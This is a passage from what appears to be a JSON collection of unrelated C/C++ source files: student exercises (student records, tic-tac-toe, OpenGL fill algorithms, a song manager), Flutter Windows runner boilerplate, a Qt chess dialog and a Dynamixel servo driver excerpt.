vec<4, int16, hig",
    "#include \"MyFunction.h\"\n\n\nnamespace My_Functions \n{\n\tvoid inputStudent(int studentnum, vector<string>& names, vector<int>& ages, vector<string>& births)\n\t{\n\t\t//studentnum;\n\t\tcout << \"\ud559\uc0dd \uc218\ub97c \uc785\ub825\ud558\uc138\uc694 : \";\n\t\tcin >> studentnum;\n\n\t\tfor (int i = 0; i < studentnum; ++i)\n\t\t{\n\t\t\tstring name;\n\t\t\tcout << \"\uc774\ub984\uc744 \uc785\ub825\ud558\uc138\uc694 : \";\n\t\t\tcin >> name;\n\t\t\tnames.push_back(name);\n\n\n\t\t\tint age;\n\t\t\tcout << \"\ub098\uc774\ub97c \uc785\ub825\ud558\uc138\uc694 : \";\n\t\t\tcin >> age;\n\t\t\tages.push_back(age);\n\n\t\t\tstring birth;\n\t\t\tcout << \"\uc0dd\uc77c\uc744 \uc785\ub825\ud574\uc8fc\uc138\uc694 (mmdd \ud615\uc2dd) : \";\n\t\t\tcin >> birth;\n\t\t\tbirths.push_back(birth);\n\t\t}\n\t}\n\n\tvoid printStudent(vector<string>& names, vector<int>& ages, vector<string>& births)\n\t{\n\t\tcout << endl;\n\n\t\tcout << \" \ud559\uc0dd \uc815\ubcf4  \" << endl;\n\n\t\tfor (int i = 0; i < names.size(); i++)\n\t\t{\n\t\t\tcout << \"\uc774\ub984 : \" << names[i] << \" \ub098\uc774 : \" << ages[i] << \" \uc0dd\uc77c : \" << births[i] << endl;\n\n\t\t}\n\t\tcout << endl;\n\t}\n\n\tvoid printAverage(vector<int>& ages)\n\t{\n\t\tint totalage = 0; // \uc804\uccb4 \ub098\uc774 \ud569 \ubcc0\uc218\n\n\t\t//ages \ubcc0\uc218\uc5d0 \uc800\uc7a5\ub41c \uac01 \ud559\uc0dd\uc758 \ub098\uc774\ub97c totalage\uc5d0 \ub354\ud568\n\t\tfor (int age : ages)\n\t\t{\n\t\t\ttotalage += age;\n\t\t}\n\t\t// \ud3c9\uade0\ub098\uc774 \uacc4\uc0b0\n\t\tdouble average = double(totalage) / ages.size();\n\n\t\tcout << \"\ud3c9\uade0 \ub098\uc774 : \" << average << \"\uc138\" << endl;\n\t\tcout << endl;\n\t}\n\n\tvoid printFastbirth(int studentnum, vector<string>& names, vector<int>& ages, vector<string>& births)\n\t{\n\t\tstring earlybirth = \"1231\"; //\ucd08\uae30\uac12\uc740 \uac00\uc7a5 \ud070 \uc0dd\uc77c\uac12\n\t\tstring earlyname;\n\t\tint earlyage = 0;\n\n\t\tfor (int i = 0; i < names.size(); i++)\n\t\t{\n\t\t\tif (births[i] < earlybirth)\n\t\t\t{\n\t\t\t\tearlybirth = births[i];\n\t\t\t\tearlyname = names[i];\n\t\t\t\tearlyage = ages[i];\n\t\t\t}\n\t\t}\n\t\tcout << \"\uac00\uc7a5 \ube60\ub978 \uc0dd\uc77c\uc740 \uc774\ub984 : \" << earlyname << \" \ub098\uc774 : \" << earlyage << \"\uc138 \uc0dd\uc77c : \" << earlybirth << endl;\n\n\t\tcout << endl;\n\t}\n\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_ex\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"acc.h\"\n#include \"./ui_acc.h\"\n\nAcc::Acc(QWidget *parent)\n    : QWidget(parent)\n    , ui(new Ui::Acc)\n{\n    ui->setupUi(this);\n    setWindowTitle(WINDOW_TITLE_ACC);\n    setWindowIcon(QIcon(ICON_CHESS));\n    setFixedSize(400, 160);\n}\n\nAcc::~Acc()\n{\n    delete ui;\n}\n\nvoid Acc::paintEvent(QPaintEvent* event){\n    QPainter painter(this);\n    painter.setRenderHint(QPainter::Antialiasing);\n    QPixmap acc_chesses[4];\n    switch (P){\n        case White:\n            acc_chesses[0].load(IMG_WHITE_QUEEN);\n            acc_chesses[1].load(IMG_WHITE_BISHOP);\n            acc_chesses[2].load(IMG_WHITE_ROOK);\n            acc_chesses[3].load(IMG_WHITE_KNIGHT);\n            break;\n        case Black:\n            acc_chesses[0].load(IMG_BLACK_QUEEN);\n            acc_chesses[1].load(IMG_BLACK_BISHOP);\n            acc_chesses[2].load(IMG_BLACK_ROOK);\n            acc_chesses[3].load(IMG_BLACK_KNIGHT);\n            break;\n        default:\n            break;\n    }\n    for(short i=0; i<4; i++){\n        painter.drawPixmap(40+i*80, 40, 80, 80, acc_chesses[i]);\n    }\n}\n\nvoid Acc::mousePressEvent(QMouseEvent* event){\n    if(event->button()==Qt::LeftButton){\n        if(event->pos().x()>40 && event->pos().x()<360 && event->pos().y()>40 && event->pos().y()<120){\n            I = (event->pos().x()-40)/80;\n        }\n    }\n    Acced();\n    hide();\n}\n\n#include \"./ui_easteregg.h\"\n#include <QFont>\n#include <qfontdatabase.h>\n\nEasterEgg::EasterEgg(QWidget *parent)\n    : QDialog(parent)\n    , ui(new Ui::EasterEgg)\n{\n    ui->setupUi(this);\n    int fontId = QFontDatabase::addApplicationFont(FONT_MAIN);\n    QStringList fontFamilies=QFontDatabase::applicationFontFamilies(fontId);\n    QFont font;\n    font.setFamily(fontFamilies[0]);\n    font.setPointSize(18);\n    ui->ea->setFont(font);\n    ui->ea->setStyleSheet(\"color:#ff7fea;\");\n    setWindowIcon(QIcon(ICON_CHESS));\n    setFixedSize(640, 360);\n}\n\nEasterEgg::~EasterEgg()\n{\n    delete ui;\n}\n\nvoid EasterEgg::paintEvent(QPaintEvent* event){\n    QPainter painter(this);\n    painter.setRenderHint(QPainter::Antialiasing);\n    QPixmap ea;\n    ea.load(IMG_0);\n    painter.drawPixmap(0, 0, 640, 360, ea);\n}\n",
    "#include<iostream>\n#include<GL/glut.h>\nusing namespace std;\n\nvoid myInit() {\n\tglClearColor(1.0, 1.0, 1.0, 0);\n\tglColor3f(0.0, 0.0, 0.0);\n\tglPointSize(1.0);\n\tglMatrixMode(GL_PROJECTION);\n\tgluOrtho2D(0, 640, 0, 480);\n}\n\nvoid boundaryFill(float x, float y, float* b, float* n) {\n\tfloat color[3];\n\tglReadPixels(x, y, 1.0, 1.0, GL_RGB, GL_FLOAT, color);\n\tif((color[0] != b[0] || color[1] != b[1] || color[2] != b[2]) && (color[0] != n[0] || color[1] != n[1] || color[2] != n[2])) {\n\t\tglColor3f(n[0], n[1], n[2]);\n\t\tglBegin(GL_POINTS);\n\t\t\tglVertex2d(x, y);\n\t\tglEnd();\n\t\tglFlush();\n\t\tboundaryFill(x + 1, y, b, n);\n\t\tboundaryFill(x - 2, y, b, n);\n\t\tboundaryFill(x, y + 1, b, n);\n\t\tboundaryFill(x, y - 2, b, n);\n\t\tboundaryFill(x + 1, y + 1, b, n);\n\t\tboundaryFill(x + 1, y - 1, b, n);\n\t\tboundaryFill(x - 1, y + 1, b, n);\n\t\tboundaryFill(x - 1, y - 1, b, n);\n\t}\n}\n\nvoid floodFill(float x, float y, float *b, float *n) {\n\tglColor3f(0.0, 0.0, 0.0);\n\tglBegin(GL_LINE_LOOP);\n\tglVertex2d(40, 440);\n\tglVertex2d(600, 440);\n\tglColor3f(0.0, 1.0, 1.0);\n\tglVertex2d(600, 40);\n\tglVertex2d(40, 40);\n\tglEnd();\n\tfloat color[3];\n\tglReadPixels(x, y, 1.0, 1.0, GL_RGB, GL_FLOAT, color);\n\tif(color[0] == b[0] && color[1] == b[1] && color[2] == b[2]) {\n\t\tglColor3f(n[0], n[1], n[2]);\n\t\tglBegin(GL_POINTS);\n\t\t\tglVertex2d(x, y);\n\t\tglEnd();\n\t\tglFlush();\n\t\tfloodFill(x + 1, y, b, n);\n\t\tfloodFill(x - 2, y, b, n);\n\t\tfloodFill(x, y + 1, b, n);\n\t\tfloodFill(x, y - 2, b, n);\n\t\tfloodFill(x + 1, y + 1, b, n);\n\t\tfloodFill(x + 1, y - 1, b, n);\n\t\tfloodFill(x - 1, y + 1, b, n);\n\t\tfloodFill(x - 1, y - 1, b, n);\n\t}\n}\n\nvoid myDisplay() {\n\tglClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n\tglLineWidth(3);\n\tglPointSize(2);\n\tglColor3f(0.0, 0.0, 0.0);\n\tglBegin(GL_LINE_LOOP);\n\tglVertex2d(40, 440);\n\tglVertex2d(600, 440);\n\tglVertex2d(600, 40);\n\tglVertex2d(40, 40);\n\tglEnd();\n\tglFlush();\n}\n\nvoid mouse(int btn, int state, int x, int y) {\n\ty = 480 - y;\n\tif(btn == GLUT_LEFT_BUTTON) {\n\t\tif(state == GLUT_DOWN) {\n\t\t\tfloat b[] = {0, 0, 0};\n\t\t\tfloat n[] = {1, 0, 0};\n\t\t\tboundaryFill(x, y, b, n);\n\t\t}\n\t} else if(btn == GLUT_RIGHT_BUTTON) {\n\t\tif(state == GLUT_DOWN) {\n\t\t\tfloat b[3];\n\t\t\tglReadPixels(x, y, 1.0, 1.0, GL_RGB, GL_FLOAT, b);\n\t\t\tcout << b[0] << b[1] << b[2];\n\t\t\tfloat n[] = {1, 0, 0};\n\t\t\tfloodFill(x, y, b, n);\n\t\t}\n\t}\n}\n\nint main(int argc, char ** argv) {\n\tcout << (\"Left Mouse Button: Boundary Fill Right Mouse Button: Flood Fill\");\n\tglutInit(&argc,argv);\n\tglutInitDisplayMode(GLUT_SINGLE | GLUT_RGB);\n\tglutInitWindowSize(640,480);\n\tglutInitWindowPosition(100,100);\n\tglutCreateWindow(\"Filling\");\n\tmyInit();\n\tglutMouseFunc(mouse);\n\tglutDisplayFunc(myDisplay);\n\tglutMainLoop();\n}\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"win_ssl_httpclient_no_proxy\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*******************************************************************************\n* Copyright 2016 ROBOTIS CO., LTD.\n*\n* Licensed under the Apache License, Version 2.0 (the \"License\");\n* you may not use this file except in compliance with the License.\n* You may obtain a copy of the License at\n*\n*     http://www.apache.org/licenses/LICENSE-2.0\n*\n* Unless required by applicable law or agreed to in writing, software\n* distributed under the License is distributed on an \"AS IS\" BASIS,\n* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n* See the License for the specific language governing permissions and\n* limitations under the License.\n*******************************************************************************/\n\n#include \"Dynamixel2Espressif.h\"\n#include <memory.h>\n#include \"arduino_droppings.h\"\n#include \"esp_log.h\"\n\nstatic const char * TAG = \"DXL2ESP\";\n\nnamespace DYNAMIXEL{\n\nconst uint16_t model_number_table[] PROGMEM = {\n    AX12A, AX12W, AX18A,\n    \n    RX10, RX24F, RX28, RX64,\n    \n    DX113, DX116, DX117,\n    \n    EX106,\n\n    MX12W,  MX28,   MX64,    MX106,\n    MX28_2, MX64_2, MX106_2,\n    \n    XL320,\n    XL330_M288,\n    XL330_M077,\n    XC330_M181,\n    XC330_M288,    \n    XC330_T181,\n    XC330_T288,    \n    XL430_W250,\n    XXL430_W250,\n    XC430_W150,  XC430_W240,\n    XXC430_W250,\n    XM430_W210,  XM430_W350,\n    XM540_W150,  XM540_W270, \n    XH430_V210,  XH430_V350, XH430_W210, XH430_W350,\n    XH540_V150,  XH540_V270, XH540_W150, XH540_W270,\n    XD430_T210,  XD430_T350,\n    XD540_T150,  XD540_T270,\n    XW430_T200,  XW430_T333,\n    XW540_T140,  XW540_T260,\n\n    PRO_L42_10_S300_R,   \n    PRO_L54_30_S400_R,   PRO_L54_30_S500_R,   PRO_L54_50_S290_R,   PRO_L54_50_S500_R,\n    PRO_M42_10_S260_R,   PRO_M42_10_S260_RA,\n    PRO_M54_40_S250_R,   PRO_M54_40_S250_RA,  PRO_M54_60_S250_R,   PRO_M54_60_S250_RA,\n    PRO_H42_20_S300_R,   PRO_H42_20_S300_RA,\n    PRO_H54_100_S500_R,  PRO_H54_100_S500_RA, PRO_H54_200_S500_R,  PRO_H54_200_S500_RA,\n\n    PRO_M42P_010_S260_R, \n    PRO_M54P_040_S250_R, PRO_M54P_060_S250_R,\n    PRO_H42P_020_S300_R, \n    PRO_H54P_100_S500_R, PRO_H54P_200_S500_R\n};\n\nconst uint8_t model_number_table_count = sizeof(model_number_table)/sizeof(model_number_table[0]);\n\nenum Functions{\n  SET_ID,\n  SET_BAUD_RATE,\n\n  SET_PROTOCOL,\n \n  SET_POSITION,\n  GET_POSITION,\n\n  SET_VELOCITY,\n  GET_VELOCITY,\n\n  SET_PWM,\n  GET_PWM,\n\n  SET_CURRENT,\n  GET_CURRENT,\n\n  LAST_DUMMY_FUNC = 0xFF\n};\n\n} //namespace DYNAMIXEL\n\nusing namespace DYNAMIXEL;\n\ntypedef struct ModelDependencyFuncItemAndRangeInfo{\n  uint8_t func_idx; //enum Functions\n  uint8_t item_idx; //enum ControlTableItem\n  uint8_t unit_type; //enum ParamUnit\n  int32_t min_value;\n  int32_t max_value;\n  float unit_value;\n} ModelDependencyFuncItemAndRangeInfo_t;\n\ntypedef struct ItemAndRangeInfo{\n  uint8_t item_idx; //enum ControlTableItem\n  uint8_t unit_type; //enum ParamUnit\n  int32_t min_value;\n  int32_t max_value;\n  float unit_value;\n} ItemAndRangeInfo_t;\n\nstatic ItemAndRangeInfo_t getModelDependencyFuncInfo(uint16_t model_num, uint8_t func_num);\nstatic float f_map(float x, float in_min, float in_max, float out_min, float out_max);\nstatic bool checkAndconvertWriteData(float in_data, int32_t &out_data, uint8_t unit, ItemAndRangeInfo_t &item_info);\nstatic bool checkAndconvertReadData(int32_t in_data, float &out_data, uint8_t unit, ItemAndRangeInfo_t &item_info);\n\n\nDynamixel2Espressif::Dynamixel2Espressif(uint16_t packet_buf_size)\n: Master(2.0, packet_buf_size), model_number_idx_last_index_(0)\n{\n  memset(&model_number_idx_, 0xff, sizeof(model_number_idx_));\n}\n\nDynamixel2Espressif::Dynamixel2Espressif(uart_port_t uart_num, gpio_num_t dir_pin, uint16_t packet_buf_size)\n: Master(2.0, packet_buf_size), model_number_idx_last_index_(0)\n{\n  p_dxl_port_ = new SerialPortHandler(uart_num, dir_pin);\n  ESP_LOGI(TAG, \"UART port num: %d\", uart_num);\n  setPort(p_dxl_port_);\n  memset(&model_number_idx_, 0xff, sizeof(model_number_idx_));\n}\n\n/* For Master configuration */\nvoid Dynamixel2Espressif::begin(unsigned long baud)\n{\n  p_dxl_port_ = (SerialPortHandler*)getPort();\n\n  if(p_dxl_port_ == nullptr){\n    setLastLibErrCode(D2A_LIB_ERROR_NULLPTR_PORT_HANDLER);\n    return;\n  }\n\n  p_dxl_port_->begin(baud);\n}\n\nunsigned long Dynamixel2Espressif::getPortBaud()\n{\n  p_dxl_port_ = (SerialPortHandler*)getPort();\n\n  if(p_dxl_port_ == nullptr){\n    setLastLibErrCode(D2A_LIB_ERROR_NULLPTR_PORT_HANDLER);\n    return 0;\n  }\n\n  return p_dxl_port_->getBaud();\n}\n\nbool Dynamixel2Espressif::scan()\n{\n  bool ret = true;\n\n  ret = ping();\n\n  return ret;\n}\n\nbool Dynamixel2Espressif::ping(uint8_t id)\n{\n  bool ret = false;\n \n  if (id != DXL_BROADCAST_ID){\n    InfoFromPing_t recv_info;\n    if(Master::ping(id, &recv_info, 1, 10) > 0){\n      if(recv_info.id == id){\n        if(getPortProtocolVersion() == 1.0){\n          recv_info.model_number = getModelNumber(id);\n        }\n        ret = setModelNumber(id, recv_info.model_number);\n      }\n    }\n  }else{\n    uint8_t recv_ids[254];\n    uint8_t rec",
    "#include <bits/stdc++.h>\nusing namespace std;\n/*\n    // TERMINOLOGY\n    rectangle's sides are parallel to x and y axises.\n    vector<int> rect(4); \n    0  1  2  3\n    x1,y1 x2,y2\n    bottom left = x1,y1\n    top right = x2,y2\n*/\n\n\n// do s1 and s2 intersect\nbool intersect(vector<int> s1, vector<int> s2) {\n\tint bl_a_x = s1[0], bl_a_y = s1[1], tr_a_x = s1[2], tr_a_y = s1[3];\n\tint bl_b_x = s2[0], bl_b_y = s2[1], tr_b_x = s2[2], tr_b_y = s2[3];\n\n\t// no overlap\n\tif (bl_a_x >= tr_b_x || tr_a_x <= bl_b_x || bl_a_y >= tr_b_y ||\n\t    tr_a_y <= bl_b_y) {\n\t\treturn false;\n\t} else {\n\t\treturn true;\n\t}\n}\n\n// area of intersecting rectangles\nint inter_area(vector<int> s1, vector<int> s2) {\n    if(!intersect(s1,s2)) return 0;\n\tint bl_a_x = s1[0], bl_a_y = s1[1], tr_a_x = s1[2], tr_a_y = s1[3];\n\tint bl_b_x = s2[0], bl_b_y = s2[1], tr_b_x = s2[2], tr_b_y = s2[3];\n\n\treturn ((min(tr_a_x, tr_b_x) - max(bl_a_x, bl_b_x)) *\n\t        (min(tr_a_y, tr_b_y) - max(bl_a_y, bl_b_y)));\n}\n\n// area of rectangle\nint area(vector<int> a){\n    return abs( a[0]-a[2] ) * abs(a[1]-a[3]);\n}",
    "// Tic Tac Toe Game\r\n\r\n// Author : The_mantux(C)\r\n// Date : 03-05-2024\r\n// github : https://github.com/The-mantux\r\n\r\n#include <iostream>\r\n#include <string>\r\n#include <windows.h>\r\n#include <cstdlib>\r\n#include <ctime>\r\n\r\n\r\nusing namespace std;\r\n\r\n// Colors\r\n#define RESET       \"\\033[0m\"\r\n#define BLUE        \"\\033[1m\\033[34m\"  /*Player0*/\r\n#define RED         \"\\033[1m\\033[31m\"  /*Player1*/\r\n#define YELLOW      \"\\033[1m\\033[33m\"  /*beware error*/\r\n#define GREEN       \"\\033[1m\\033[32m\"  /*Winner*/\r\n\r\n// Prototypes\r\nint  menu();\r\nvoid printTutorialTable0();\r\nvoid printTutorialTable1();\r\nvoid gameTable(char table[3][3]);\r\nint  game(char table[3][3],int x);\r\nvoid tablePrint(char table[3][3]);\r\nint  player0(char table[3][3],int vet[],int &counter);\r\nint  checker(int cell[],int number);\r\nvoid selectCell(int &row,int &col,int number);\r\nvoid next();\r\n\r\nint main(){\r\n\r\n    int s,x,counter=0,row,col;\r\n\r\n    char table[3][3]={\r\n        {'1','2','3'},\r\n        {'4','5','6'},\r\n        {'7','8','9'}\r\n    };\r\n\r\n    int cell[3*3];\r\n\r\n    do{\r\n        system(\"cls\");\r\n        s=menu();\r\n\r\n        switch(s){\r\n\r\n            case 1:{\r\n                //Game\r\n\r\n                x=rand() % 2 + 1;\r\n                break;\r\n            }\r\n\r\n            case 2:{\r\n                //Tutorial\r\n\r\n                cout<<\"\\nPlayer 1 : \"<<BLUE<<\"X\"<<RESET<<endl;\r\n                cout<<\"Player 2 : \"<<RED<<\"O\"<<RESET<<endl;\r\n\r\n                cout<<\"\\n\";\r\n\r\n                cout<<\"At the beginning of the game you will be randomly chosen which player will start the game...\"<<endl;\r\n\r\n                next();\r\n                cin.get();\r\n\r\n                cout<<\"This is the game table: \\n\";\r\n                printTutorialTable0();\r\n                cout<<\"\\nSelect the cell number you want to select...\"<<endl;\r\n\r\n                next();\r\n\r\n                cout<<\"At the end of the game the result will be such a thing: \"<<endl;\r\n                printTutorialTable1();\r\n\r\n                next();\r\n\r\n                cout<<\"Keep track of your victories and defeats...\"<<endl;\r\n                cout<<\"Game\"<<endl;\r\n                cout<<\"Player 1 : \"<<BLUE<< 15<<\" Wins\"<<RESET<<endl;\r\n                cout<<\"Player 2 : \"<<RED<< 11<<\" Wins\"<<RESET<<endl;\r\n                cout<<\"Draws : \"<<2<<endl;\r\n\r\n                cout<<\"\\n\\nNow it's time to play\";\r\n\r\n                next();\r\n\r\n                break;\r\n            }\r\n\r\n            case 0:{\r\n                //Exit\r\n                cout<<BLUE<<\"Bye\"<<RESET<<endl;\r\n                break;\r\n            }\r\n\r\n            default:{\r\n                //Error\r\n                cout<<RED<<\"Error\"<<RESET<<endl;\r\n                break;\r\n            }\r\n        }\r\n\r\n    }while(s!=0);\r\n\r\n    return 0;\r\n}\r\n\r\nint game(char table[3][3],int x){\r\n    \r\n    if(x==1){\r\n        //Player 0\r\n        cout<<\"Player 1 starts the game\"<<endl;\r\n    }\r\n    else if(x==2){\r\n        cout<<\"Player 2 starts the game\"<<endl;\r\n    }\r\n\r\n}\r\n\r\nvoid tablePrint(char table[3][3]){\r\n\r\n    cout<<\"     |     |     \"<<endl;\r\n    cout<<\"  \"<<table[0][0]<<\"  |  \"<<table[0][1]<<\"  |  \"<<table[0][2]<<\"  \"<<endl;\r\n    cout<<\"_____|_____|_____\"<<endl;\r\n    cout<<\"     |     |     \"<<endl;\r\n    cout<<\"  \"<<table[1][0]<<\"  |  \"<<table[1][1]<<\"  |  \"<<table[1][2]<<\"  \"<<endl;\r\n    cout<<\"_____|_____|_____\"<<endl;\r\n    cout<<\"     |     |     \"<<endl;\r\n    cout<<\"  \"<<table[2][0]<<\"  |  \"<<table[2][1]<<\"  |  \"<<table[2][2]<<\"  \"<<endl;\r\n    cout<<\"     |     |     \"<<endl;\r\n}\r\n\r\nint player0(char table[3][3],int vet[],int &counter){\r\n    //Player 1\r\n\r\n    int cell,c=0,c1=0;\r\n\r\n    void tablePrint(char table[3][3]);\r\n\r\n    do{\r\n\r\n        cout<<\"Select the cell number you want to select...\"<<endl;\r\n        cin>>cell;\r\n\r\n        if(cell<1 || cell>9){\r\n            cout<<RED<<\"Insert an existing cell\"<<RESET<<endl;\r\n            c=-1;\r\n        }\r\n\r\n        c1=checker(vet,cell);\r\n        \r\n        if(c1==-1){\r\n            cout<<RED<<\"The cell is already occupied\\n\";\r\n        }\r\n\r\n\r\n    }while(c==-1 || c1==-1);\r\n\r\n    vet[counter]=cell;\r\n    counter++;\r\n\r\n    return cell;\r\n}\r\n\r\nvoid selectCell(int &row,int &col,int number){\r\n\r\n    if(number==1){\r\n        row=0;\r\n        col=0;\r\n    }\r\n    else if(number==2){\r\n        row=0;\r\n        col=1;\r\n    }\r\n    else if(number==3){\r\n        row=0;\r\n        col=2;\r\n    }\r\n    else if(number==4){\r\n        row=1;\r\n        col=0;\r\n    }\r\n    else if(number==5){\r\n        row=1;\r\n        col=1;\r\n    }\r\n    else if(number==6){\r\n        row=1;\r\n        col=2;\r\n    }\r\n    else if(number==7){\r\n        row=2;\r\n        col=0;\r\n    }\r\n    else if(number==8){\r\n        row=2;\r\n        col=1;\r\n    }\r\n    else if(number==9){\r\n        row=2;\r\n        col=2;\r\n    }\r\n}\r\n\r\nint checker(int cell[],int number){\r\n\r\n    bool check=false;\r\n\r\n    for(int i=0;i<sizeof(cell);i++){\r\n\r\n        if(cell[i]==number){\r\n            check=true;\r\n        }\r\n    }\r\n\r\n    if(check==true){\r\n        return -1;\r\n    }\r\n    else{\r\n        return 0;\r\n    }\r\n}\r\n\r\nvoid printTutorialTable0(){\r\n",
    "#include <iostream>\n#include <string>\n#include \"Manager.h\"\n#include \"Heap.h\"\n#include \"BST_songTitle.h\"\n#include \"BST_song.h\"\n#include \"Song.h\"\n\nusing namespace std;\n\nBST_song songTree;\nBST_songTitle songTitleTree;\nHeap songTime;\n\nvoid Manager::addSong(Song &value){\n\tsongTree.insert(value);\n\tsongTitleTree.insert(value);\n\tsongTime.Push(&value);\n\n\tcout <<  endl << \"new song \" << value.getSongID() << \" \" << value.getSongTitle() << endl;\n}\n\nvoid Manager::show_listen_time(){\n\tsongTree.printInOrder(songTree.getRoot());\n}\n\nvoid Manager::listen(string &title, int seconds){\n\tint index = songTitleTree.listenHelper(title, seconds);\n\tsongTime.PercolateUp(index);\n\tsongTime.Peek();\n}\n\nvoid Manager::favorite(){//Finished and tested on 4/28/2024 @ 1:06PM. -Kian F\n\tif(songTime.Empty()){\n\t\tcout << \"No song to favorite\" << endl;\n\t\treturn;\n\t}\n    Song* topSng=songTime.Pop();//Pop the top song from the heap- 4/28/24 Kian F \n    if(topSng == nullptr){\n        cout << \"Heap is empty, no song to favorite.\" << endl;\n        return;\n    }\n\n    topSng->setIsFavorite(true);//Set the favorite flag to true, should effect song in BST- 4/28/24 Kian F \n    cout <<\"Song \"<< topSng->getSongTitle() << \" added to list of favorites (\"<<topSng->getSongDuration()<<\")\" << endl;//Printing-Kian F\n}\n\nbool Manager::uniqueID(Song &song){\n\treturn songTree.search(song);\n}\n\n// bool Manager::checkSong(string &title){\n// \treturn true; // Not impemented yet -> meant to check if the song exists or not -> multiple uses ? Maybe\n// }\n\n/* \nRemoves the song from the BST_songTitle and Heap, and sets its \n   'removed' attribute = true so that its effectively \"removed\" from the BST_song\n\nNote:\n\t  a song being a favorite has no effect on how its removed, it just prints out\n\t  a slightly different output\n*/\nvoid Manager::remove(string &songToDelete)\n{\n\t// make sure the song exists first\n\tif(songTitleTree.findAndReturnSong(songToDelete) != nullptr)\n\t{\n\t\t// set the songs id to something never to be used to free up the old ID\n\t\tsongTitleTree.setSongIDHelper(songToDelete, -1);\n\n\t\t// \"remove\" it from the Song Object BST... just set its removed stat = true\n\t\tsongTitleTree.setRemovedStatHelper(songToDelete, true);\n\n\t\t//  if the song isnt a favorite\n\t\tif(songTitleTree.getFavoriteStatHelper(songToDelete) == false)\n\t\t\tcout << endl << \"Removed \" << songToDelete << \" from your songs\" << endl;\n\t\telse \t// the song is a favorite\n\t\t\tcout << endl << \"Removed \" << songToDelete << \" from your favorites\" << endl;\n\t\t\n\t\t// remove it from the Heap\n\t\tsongTime.Remove(songTitleTree.getHeapIndexHelper(songToDelete));\n\n\t\t// remove it from the Title BST\n\t\tsongTitleTree.removeHelper(songToDelete);\n\t}\n\telse\n\t{\n\t\tcout << endl << \"Song \" << songToDelete << \" does not exist\" << endl;\n\t} // show_listen_time\n}\t\nbool Manager::checkSong(string &title){\n\treturn true; // Not impemented yet -> meant to check if the song exists or not -> multiple uses ? Maybe\n}\n",
